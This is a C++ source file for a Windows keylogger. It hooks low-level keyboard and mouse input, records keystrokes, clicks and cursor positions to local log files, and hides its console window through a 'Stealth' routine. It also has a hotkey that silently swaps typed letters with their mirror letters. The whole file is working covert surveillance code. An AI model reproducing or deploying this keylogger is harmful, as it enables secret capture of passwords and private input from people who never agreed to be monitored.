#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include "Keys.h"

using namespace std;

static const string kKeyboardLog = "KeyboardLog";
static const string kMouseLog = "MouseLog";

static ofstream keyboard_log_stream;
static ofstream mouse_log_stream;

static bool allow_substitution = false;
static bool substituted = false;

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, SW_HIDE);
}

DWORD SubstituteKey(DWORD vkCode)
{
	return Keys::A_KEY + Keys::Z_KEY - vkCode;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL skip_key_stroke = FALSE;
	PKBDLLHOOKSTRUCT param = (PKBDLLHOOKSTRUCT)lParam;
	DWORD code = param->vkCode;

	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_SYSKEYDOWN:
			if (skip_key_stroke = (code == Keys::ESCAPE_KEY))
			{
				PostQuitMessage(EXIT_SUCCESS);
			}
			if (skip_key_stroke = (code == Keys::LEFT_SHIFT_KEY))
			{
				allow_substitution = !allow_substitution;
			}
			break;

		case WM_KEYDOWN:
			if (allow_substitution && (code >= Keys::A_KEY && code <= Keys::Z_KEY))
			{
				if (!substituted)
				{
					substituted = true;
					code = SubstituteKey(param->vkCode);
					keybd_event(code, 0, 0, 0);

					skip_key_stroke = TRUE;
					break;
				}
				else substituted = false;
			}

			keyboard_log_stream << "Key " << (char)code << " was pressed" << endl;
			break;

		default:
			break;
		}
	}

	return (skip_key_stroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PMSLLHOOKSTRUCT param = (PMSLLHOOKSTRUCT)lParam;

	if (nCode >= 0)
	{
		switch (wParam)
		{
		case WM_LBUTTONDOWN:
			mouse_log_stream << "Left button was pressed" << endl;
			break;

		case WM_RBUTTONDOWN:
			mouse_log_stream << "Right button was pressed" << endl;
			break;

		case WM_MOUSEMOVE:
			mouse_log_stream << "Mouse position: " << "x: " << param->pt.x << " y: " << param->pt.y << endl;
			break;

		default:
			break;
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
	// hide console
	Stealth();

	HHOOK hook_low_level_keyboard;
	HHOOK hook_low_level_mouse;

	if (!(hook_low_level_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0)))
	{
		cerr << "Failed to install keyboard hook! Error: " << GetLastError() << endl;
		system("pause");
		exit(EXIT_FAILURE);
	}
	if (!(hook_low_level_mouse = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, 0, 0)))
	{
		UnhookWindowsHookEx(hook_low_level_keyboard);
		cerr << "Failed to install mouse hook! Error: " << GetLastError() << endl;
		system("pause");
		exit(EXIT_FAILURE);
	}

	keyboard_log_stream.open(kKeyboardLog, ios::out | ios::ate);
	mouse_log_stream.open(kMouseLog, ios::out | ios::ate);

	// keep this app running until we're told to stop (waiting for PostQuitMessage)
	MSG message;

	auto const res = GetMessage(&message, NULL, NULL, NULL);
	
	if (0 > res)
	{
		cerr << "An error has occured!" << endl;
		system("pause");
	}

	keyboard_log_stream.close();
	mouse_log_stream.close();

	UnhookWindowsHookEx(hook_low_level_keyboard);
	UnhookWindowsHookEx(hook_low_level_mouse);

	return 0;
}